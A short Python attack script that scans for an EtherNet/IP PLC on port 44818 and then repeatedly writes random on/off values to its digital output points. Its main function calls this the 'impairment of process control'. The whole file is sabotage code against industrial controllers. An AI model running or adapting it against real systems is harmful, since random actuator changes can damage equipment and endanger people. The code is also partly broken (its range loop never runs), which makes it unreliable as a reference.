from cpppo.server.enip import client
import socket
import time
import random

# Define the IP address of the PLC
plc_ip = None

# Function to find the PLC's IP address if it's not known
def find_plc_ip():
    # This could involve scanning the network or using a discovery protocol
    # For simplicity, let's assume you have a list of potential IPs
    potential_ips = ['192.168.1.1', '192.168.1.2']
    for ip in potential_ips:
        # Send a discovery packet and check for a response
        # This step is highly dependent on the specific protocol and device
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((ip, 44818))  # 44818 is the default port for EtherNet/IP
            if result == 0:
                return ip
            sock.close()
        except socket.error:
            pass
    return None

# Function to perform brute force I/O on a range of I/O points
def brute_force_io_range():
    global plc_ip
    if plc_ip:
        print("PLC IP address:", plc_ip)
        
        # Create an EtherNet/IP client
        with client.connector(host=plc_ip) as conn:
            # Define the range of I/O points to target
            start_point = '_IO_EM_DO_01'
            end_point = '_IO_EM_DO_10'
            
            # Perform brute force I/O on the range of I/O points
            for point in range(ord(start_point[-1]), ord(end_point[-1]) + 1):
                point_name = start_point[:-1] + chr(point)
                print("Targeting point:", point_name)
                
                # Change the I/O point value to a random value
                conn.write([point_name], [random.choice([True, False])])
                time.sleep(0.1)  # Wait for 100ms before changing the next point
    else:
        print("PLC IP address not found")

# Function to perform brute force I/O on a single I/O point
def brute_force_io_single_point():
    global plc_ip
    if plc_ip:
        print("PLC IP address:", plc_ip)
        
        # Create an EtherNet/IP client
        with client.connector(host=plc_ip) as conn:
            # Define the single I/O point to target
            point_name = '_IO_EM_DO_02'
            print("Targeting point:", point_name)
            
            # Perform brute force I/O on the single I/O point
            for _ in range(100):  # Repeat the process 100 times
                # Change the I/O point value to a random value
                conn.write([point_name], [random.choice([True, False])])
                time.sleep(0.1)  # Wait for 100ms before changing the point value again
    else:
        print("PLC IP address not found")

# Main function to start the impairment of process control
def main():
    global plc_ip
    plc_ip = find_plc_ip()
    if plc_ip:
        print("PLC IP address:", plc_ip)
        
        # Perform brute force I/O on a range of I/O points
        brute_force_io_range()
        
        # Perform brute force I/O on a single I/O point
        brute_force_io_single_point()
    else:
        print("PLC IP address not found")

if __name__ == "__main__":
    main()